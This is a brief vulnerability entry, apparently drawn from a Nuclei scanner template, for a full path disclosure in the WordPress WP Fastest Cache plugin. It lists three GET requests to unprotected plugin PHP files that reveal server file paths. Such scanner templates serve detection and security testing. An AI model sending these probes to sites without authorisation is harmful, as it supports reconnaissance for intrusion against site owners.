# Vulnerability: WordPress WP Fastest Cache Plugin - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-fastest-cache-fpd.yaml`)

## Description
WordPress plugin WP Fastest Cache internal file system path was disclosed through direct access to unprotected PHP files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-fastest-cache/wpFastestCache.php
GET {{BaseURL}}/wp-content/plugins/wp-fastest-cache/inc/cache.php
GET {{BaseURL}}/wp-content/plugins/wp-fastest-cache/templates/timeout.php
```

